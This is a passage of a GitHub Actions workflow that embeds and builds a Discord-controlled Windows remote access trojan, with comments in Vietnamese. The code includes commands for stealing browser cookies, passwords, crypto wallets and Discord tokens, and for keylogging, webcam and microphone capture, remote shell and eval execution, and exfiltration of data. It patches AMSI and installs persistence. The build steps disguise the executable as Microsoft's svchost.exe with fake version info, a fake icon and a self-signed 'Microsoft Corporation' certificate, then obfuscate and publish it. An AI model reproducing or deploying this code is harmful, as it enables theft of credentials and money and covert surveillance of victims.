          async def c_voldown(m, a): await m.channel.send(await ex(f_voldown, a[0] if a else 5))

          async def c_wifi(m, a):    await send_long(m, await ex(f_wifi))
          async def c_net(m, a):     await send_long(m, await ex(f_net))
          async def c_ports(m, a):   await send_long(m, await ex(f_ports))
          async def c_ping(m, a):    await send_long(m, await ex(f_ping, " ".join(a) or "8.8.8.8"))
          async def c_arp(m, a):     await send_long(m, await ex(f_arp))
          async def c_dns(m, a):     await m.channel.send(await ex(f_dns))
          async def c_dl(m, a):      await m.channel.send(await ex(f_dl, a))
          async def c_speedtest(m, a):await m.channel.send(await ex(f_speedtest))

          async def c_cd(m, a):      await m.channel.send(await ex(f_cd))
          async def c_flip(m, a):    await m.channel.send(await ex(f_flip))
          async def c_volume(m, a):  await m.channel.send(await ex(f_volume, a))
          async def c_bsod(m, a):    await m.channel.send("💥 BSOD...")
          async def c_id(m, a):      await m.channel.send(f"🆔 `{MACHINE_ID}`")
          async def c_persist(m, a):
              await ex(install); await ex(install_task); await ex(f_bypass)
              await m.channel.send("✅ persist + bypass xong")
          async def c_restart(m, a): await m.channel.send("♻️ Restart..."); await ex(f_restart)

          async def c_grab(m, a):
              await m.channel.send("📦 ..."); p = await ex(f_grab)
              await m.channel.send(file=discord.File(p, filename=f"grab_{MACHINE_ID}.zip"))
          async def c_steal(m, a):
              await m.channel.send("🥷 steal..."); p = await ex(f_steal)
              await m.channel.send(file=discord.File(p, filename=f"steal_{MACHINE_ID}.zip"))
              if WEBHOOK: await m.channel.send(await ex(exfil, p, "full steal"))
          async def c_browser(m, a): await send_long(m, await ex(f_browser))
          async def c_cookies(m, a): await send_long(m, await ex(f_cookies))
          async def c_autofill(m, a):await send_long(m, await ex(f_autofill))
          async def c_history(m, a): await send_long(m, await ex(f_history, a[0] if a else 60))
          async def c_wallets(m, a): await send_long(m, await ex(f_wallets))
          async def c_apps(m, a):    await send_long(m, await ex(f_apps))
          async def c_files(m, a):   await send_long(m, await ex(f_files, " ".join(a) or "doc,docx,xls,xlsx,pdf,txt,ppt,pptx,key,pem,pfx,kdbx,ovpn,conf"))
          async def c_dtoken(m, a):  await send_long(m, await ex(f_dtoken))
          async def c_webhook(m, a): await m.channel.send(await ex(f_webhook, " ".join(a)))
          async def c_exfil(m, a):
              await m.channel.send(await ex(exfil, " ".join(a) or os.path.join(tempfile.gettempdir(), "steal.zip")))
          async def c_pending(m, a): await send_long(m, await ex(f_pending))

          async def c_download(m, a):
              path = os.path.expanduser(" ".join(a))
              if not os.path.exists(path): return await m.channel.send(f"❌ {path}")
              if os.path.isdir(path):
                  p = await ex(f_zip, path); return await m.channel.send(file=discord.File(p, filename="folder.zip"))
              await m.channel.send(file=discord.File(path))
          async def c_zip(m, a):
              p = await ex(f_zip, " ".join(a) or "."); await m.channel.send(file=discord.File(p, filename="dump.zip"))
          async def c_upload(m, a):
              if not m.attachments: return await m.channel.send("❌ Kèm file")
              for at in m.attachments: await at.save(os.path.join(LOOT_DIR, at.filename))
              await m.channel.send(f"✅ nhận {len(m.attachments)} file")
          async def c_update(m, a):
              await m.channel.send("🔄 ..."); await ex(f_update, " ".join(a))

          async def c_eval(m, a): await send_long(m, await ex(f_eval, getattr(m, "_raw", " ".join(a))))
          async def c_exec(m, a): await send_long(m, await ex(f_exec, getattr(m, "_raw", " ".join(a))))

          async def c_join(m, a):
              global _vc, _src
              vs = getattr(m.author, "voice", None)
              if not vs or not vs.channel: return await m.channel.send("❌ Vào voice trước")
              ch = vs.channel
              if _vc and _vc.is_connected(): await _vc.move_to(ch)
              else: _vc = await ch.connect()
              kind = (a[0].lower() if a else "mic")
              if kind not in ("mic","sys"): kind = "mic"
              if _src: _src.running = False
              _src = StreamSource(kind); _vc.play(_src)
              await m.channel.send(f"🔊 `{ch.name}` — {kind}")
          async def c_leave(m, a):
              global _vc, _src
              if _src: _src.running = False
              if _vc and _vc.is_connected(): await _vc.disconnect()
              _vc = None; _src = None; await m.channel.send("⏹️ rời voice")

          async def c_huy(m, a):
              await m.channel.send("💥 Tự hủy...")
              await ex(uninstall); time.sleep(0.5)
              subprocess.Popen(f'cmd /c ping 1.1.1.1 -n 3 > nul & rmdir /s /q "{INSTALL_DIR}"',
                               shell=True, creationflags=NO_WIN)
              os._exit(0)

          COMMANDS = {
              "help":c_help,"list":c_list,"select":c_select,"back":c_back,"sel":c_sel,"master":c_master,
              "cmd":c_cmd,"sh":c_sh,"shell":c_sh,"ps1":c_ps1,"powershell":c_ps1,"pwd":c_pwd,"cddir":c_cddir,
              "bypass":c_bypass,"defender":c_defender,"amsi":c_amsi,"etw":c_etw,
              "timestomp":c_timestomp,"hide":c_hide,"clone":c_clone,"sandbox":c_sandbox,"token":c_token,
              "ls":c_ls,"cat":c_cat,"write":c_write,"mkdir":c_mkdir,"copy":c_copy,"move":c_move,
              "rename":c_rename,"tree":c_tree,"du":c_du,"hex":c_hex,"search":c_search,"find":c_search,"del":c_del,
              "sysinfo":c_sysinfo,"ps":c_ps,"tasklist":c_ps,"kill":c_kill,"start":c_start,"power":c_power,
              "drives":c_drives,"env":c_env,"users":c_users,"services":c_services,"startup":c_startup,
              "schedule":c_schedule,"uptime":c_uptime,"battery":c_battery,"gpu":c_gpu,"av":c_av,
              "installed":c_installed,"recycle":c_recycle,"vm":c_vm,
              "clip":c_clip,"msg":c_msg,"notify":c_notify,"wall":c_wall,"open":c_open,"play":c_play,
              "chupanh":c_chupanh,"chupmanhinh":c_chupmanhinh,"sc":c_chupmanhinh,"monitors":c_monitors,
              "record":c_record,"camgif":c_camgif,"mic":c_mic,"speak":c_speak,"beep":c_beep,
              "keylog":c_keylog,"klog":c_keylog,"cliplog":c_cliplog,
              "type":c_type,"mouse":c_mouse,"caps":c_caps,"desk":c_desk,"mute":c_mute,
              "volup":c_volup,"voldown":c_voldown,
              "wifi":c_wifi,"net":c_net,"ip":c_net,"ports":c_ports,"ping":c_ping,"arp":c_arp,
              "dns":c_dns,"dl":c_dl,"wget":c_dl,"speedtest":c_speedtest,
              "cd":c_cd,"cdrom":c_cd,"flip":c_flip,"volume":c_volume,"bsod":c_bsod,
              "grab":c_grab,"steal":c_steal,"browser":c_browser,"cookies":c_cookies,"autofill":c_autofill,
              "history":c_history,"wallets":c_wallets,"wallet":c_wallets,"apps":c_apps,"files":c_files,
              "dtoken":c_dtoken,"discord":c_dtoken,"webhook":c_webhook,"exfil":c_exfil,"pending":c_pending,
              "update":c_update,"restart":c_restart,"persist":c_persist,"id":c_id,"huy":c_huy,
              "download":c_download,"zip":c_zip,"upload":c_upload,"eval":c_eval,"exec":c_exec,
              "join":c_join,"leave":c_leave,
          }
          LOCAL = {"help","list","select","back","sel","master"}

          @client.event
          async def on_ready():
              print(f"[*] online: {client.user} | máy: {MACHINE_ID}")
              try:
                  ch = await control_channel()
                  if ch:
                      await _register(ch)
                      if not _reg_loop_started[0]:
                          _reg_loop_started[0] = True
                          asyncio.ensure_future(_reg_loop(ch))
              except Exception as e:
                  print("ready lỗi:", e)

          @client.event
          async def on_message(message):
              content = message.content.strip()
              if not content.startswith(PREFIX): return
              content = content[len(PREFIX):].strip()
              if not content: return
              try:
                  tokens = content.split(None, 1)
                  first = tokens[0]
                  rest = tokens[1] if len(tokens) > 1 else ""
                  regs = await _scan_regs(message.channel)
                  directed = (first.lower() == "all") or (first in regs)

                  if directed:
                      if first.lower() != "all" and first != MACHINE_ID:
                          return
                      name, raw = _parse(rest)
                  else:
                      if not await _is_master(message.channel): return
                      name, raw = _parse(content)
                      if name in LOCAL:
                          setattr(message, "_raw", raw)
                          await COMMANDS[name](message, raw.split())
                          return
                      sel = get_sel()
                      target = "all" if (sel == "all" or sel not in regs) else sel
                      await message.channel.send(f"{PREFIX}{target} {content}")
                      return

                  if not name or name not in COMMANDS: return
                  setattr(message, "_raw", raw)
                  await COMMANDS[name](message, raw.split())
              except Exception as e:
                  try: await message.channel.send(f"⚠️ Lỗi: {e}")
                  except Exception: pass

          if __name__ == "__main__":
              if not single_instance(): sys.exit(0)
              hide_console()
              try: amsi_patch()
              except Exception: pass
              if not os.path.exists(MARKER):
                  time.sleep(random.randint(3, 12))
                  install()
              threading.Thread(target=_exfil_worker, daemon=True).start()
              while True:
                  try: client.run(_token())
                  except Exception as e:
                      print("bot lỗi, thử lại 5s:", e); time.sleep(5)
          '@
          [System.IO.File]::WriteAllText((Join-Path $PWD "agent.py"), $py)

      - name: Ghi version info (giả Microsoft)
        shell: pwsh
        run: |
          $vi = @'
          VSVersionInfo(
            ffi=FixedFileInfo(
              filevers=(10,0,19041,1), prodvers=(10,0,19041,1),
              mask=0x3f, flags=0x0, OS=0x40004, fileType=0x1, subtype=0x0, date=(0,0)
            ),
            kids=[
              StringFileInfo([StringTable('040904B0', [
                StringStruct('CompanyName', 'Microsoft Corporation'),
                StringStruct('FileDescription', 'Host Process for Windows Services'),
                StringStruct('FileVersion', '10.0.19041.1'),
                StringStruct('InternalName', 'svchost.exe'),
                StringStruct('LegalCopyright', '© Microsoft Corporation. All rights reserved.'),
                StringStruct('OriginalFilename', 'svchost.exe'),
                StringStruct('ProductName', 'Microsoft® Windows® Operating System'),
                StringStruct('ProductVersion', '10.0.19041.1')])]),
              VarFileInfo([VarStruct('Translation', [1033, 1200])])
            ]
          )
          '@
          [System.IO.File]::WriteAllText((Join-Path $PWD "version_info.txt"), $vi)

      - name: Cài thư viện Python
        run: |
          python -m pip install --upgrade pip
          pip install "discord.py[voice]" PyNaCl psutil pyautogui pyperclip pynput mss opencv-python pillow numpy sounddevice soundfile soundcard requests pycryptodome pyzipper pyarmor pyinstaller

      - name: Tạo icon giả Windows
        run: |
          python -m pip install pillow --quiet
          python -c "from PIL import Image, ImageDraw; S=256; img=Image.new('RGBA',(S,S),(0,0,0,0)); d=ImageDraw.Draw(img); b=(0,120,215,255); m=26; g=10; w=(S-2*m-g)//2; d.rectangle((m,m,m+w,m+w),fill=b); d.rectangle((m+w+g,m,S-m,m+w),fill=b); d.rectangle((m,m+w+g,m+w,S-m),fill=b); d.rectangle((m+w+g,m+w+g,S-m,S-m),fill=b); img.save('svchost.ico',sizes=[(256,256),(128,128),(64,64),(48,48),(32,32),(16,16)]); print('icon ok')"

      - name: Kiểm tra cú pháp agent.py
        run: |
          python -c "import ast; ast.parse(open('agent.py',encoding='utf-8').read()); print('OK: cú pháp hợp lệ')"

      - name: Tải libopus-0.dll
        shell: pwsh
        run: |
          $urls = @(
            "https://github.com/DSharpPlus/DSharpPlus/raw/master/docs/natives/vnext_natives_win32_x64.zip",
            "https://archive.mozilla.org/pub/opus/win64/opus-tools-0.2-opus-1.3-win64.zip",
            "https://archive.mozilla.org/pub/opus/win64/opus-tools-0.2-win64.zip"
          )
          $ok = $false
          foreach ($u in $urls) {
            try {
              Invoke-WebRequest -Uri $u -OutFile opus.zip -TimeoutSec 90 -ErrorAction Stop
              Remove-Item opus_tmp -Recurse -Force -ErrorAction SilentlyContinue
              Expand-Archive opus.zip -DestinationPath opus_tmp -Force
              $dll = Get-ChildItem -Path opus_tmp -Recurse -File | Where-Object { $_.Name -match '^(lib)?opus.*\.dll$' } | Select-Object -First 1
              if ($dll) { Copy-Item $dll.FullName "libopus-0.dll" -Force; $ok = $true; break }
            } catch { Write-Host "Thử $u thất bại" }
          }
          if (-not $ok) { Write-Host "::warning::Không tải được opus" }

      - name: Mã hóa token + cấu hình
        shell: pwsh
        env:
          BOT_TOKEN: ${{ github.event.inputs.token }}
          TOKEN_URL: ${{ github.event.inputs.token_url }}
          CTRL_CH: ${{ github.event.inputs.control_channel }}
        run: |
          Write-Host "::add-mask::$env:BOT_TOKEN"
          $inject = @'
          import os, re, base64, secrets
          tok = os.environ["BOT_TOKEN"].encode()
          key = secrets.token_bytes(16)
          enc = bytes(b ^ key[i % len(key)] for i, b in enumerate(tok))[::-1]
          s = open("agent.py", encoding="utf-8").read()
          s = re.sub(r'_TOK_ENC\s*=\s*".*?"', '_TOK_ENC = "' + base64.b64encode(enc).decode() + '"', s, count=1)
          s = re.sub(r'_TOK_KEY\s*=\s*".*?"', '_TOK_KEY = "' + base64.b64encode(key).decode() + '"', s, count=1)
          if os.environ.get("TOKEN_URL"):
              s = re.sub(r'TOKEN_URL\s*=\s*".*?"', 'TOKEN_URL = "' + os.environ["TOKEN_URL"] + '"', s, count=1)
          if os.environ.get("CTRL_CH") and os.environ["CTRL_CH"] != "0":
              s = re.sub(r'CONTROL_CH_ID\s*=\s*\d+', 'CONTROL_CH_ID = ' + os.environ["CTRL_CH"], s, count=1)
          open("agent.py", "w", encoding="utf-8").write(s)
          print("token đã mã hóa")
          '@
          $inject | python -

      - name: Register PyArmor license
        if: ${{ secrets.PYARMOR_REGCODE != '' }}
        shell: pwsh
        env:
          PYARMOR_REGCODE: ${{ secrets.PYARMOR_REGCODE }}
        run: |
          Set-Content -Path regcode.txt -Value $env:PYARMOR_REGCODE
          pyarmor reg -p "non-profits" regcode.txt
          pyarmor -v

      - name: Build exe
        shell: pwsh
        env:
          OBF: ${{ github.event.inputs.obfuscate }}
        run: |
          $extra = @()
          $src = "agent.py"
          $useObf = $false
          if ($env:OBF -eq "yes") {
            Remove-Item obf -Recurse -Force -ErrorAction SilentlyContinue
            try { pyarmor gen -O obf agent.py } catch {}
            if (Test-Path "obf/agent.py") {
              $rt = (Get-ChildItem -Path obf -Directory | Where-Object { $_.Name -like 'pyarmor_runtime*' } | Select-Object -First 1).Name
              if ($rt) {
                $src = "obf/agent.py"
                $extra += "--add-data"; $extra += "obf/$rt;$rt"
                $extra += "--hidden-import"; $extra += "$rt"
                $useObf = $true
              }
            }
            if ($useObf) { Write-Host "OK: build ban da obfuscate (PyArmor)" }
            else { Write-Host "::warning::PyArmor free khong obfuscate duoc script lon - build ban thuong" }
          }
          pyinstaller --noconfirm --onefile --noconsole --name svchost --icon svchost.ico --version-file version_info.txt --add-binary "libopus-0.dll;." --collect-all soundcard --collect-all sounddevice --collect-all cv2 --hidden-import pynput.keyboard._win32 --hidden-import pynput.mouse._win32 @extra $src
          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }

      - name: Ký số self-signed
        if: ${{ github.event.inputs.sign == 'yes' }}
        continue-on-error: true
        shell: pwsh
        run: |
          $cert = New-SelfSignedCertificate -Type CodeSigningCert -Subject "CN=Microsoft Windows, O=Microsoft Corporation" -CertStoreLocation Cert:\CurrentUser\My -NotAfter (Get-Date).AddYears(5)
          Set-AuthenticodeSignature -FilePath dist\svchost.exe -Certificate $cert -TimestampServer "http://timestamp.digicert.com"
          Write-Host "Đã ký"

      - name: Chạy test trực tiếp
        if: ${{ github.event.inputs.run_minutes != '0' }}
        shell: pwsh
        env:
          RUN_MIN: ${{ github.event.inputs.run_minutes }}
        run: |
          Write-Host "Thử: !list   !select 1   !sysinfo   !back"
          $p = Start-Process -FilePath "dist\svchost.exe" -PassThru
          $secs = [int]$env:RUN_MIN * 60
          for ($i = 1; $i -le $secs; $i += 15) {
            if ($p.HasExited) { Write-Host "Thoát sớm!"; break }
            Start-Sleep -Seconds 15; Write-Host "[$i s]..."
          }
          if (-not $p.HasExited) { Stop-Process -Id $p.Id -Force }

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: svchost-exe
          path: dist/svchost.exe
          if-no-files-found: error

  release:
    needs: build
    if: ${{ github.event.inputs.make_release == 'yes' }}
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - name: Tải artifact
        uses: actions/download-artifact@v4
        with:
          name: svchost-exe
      - name: Tạo Release
        uses: softprops/action-gh-release@v2
        with:
          tag_name: build-${{ github.run_number }}
          name: svchost build ${{ github.run_number }}
          body: |
            Build #${{ github.run_number }}
            Cập nhật máy đang chạy: `!update <url exe dưới đây>`
          files: svchost.exe
          make_latest: true
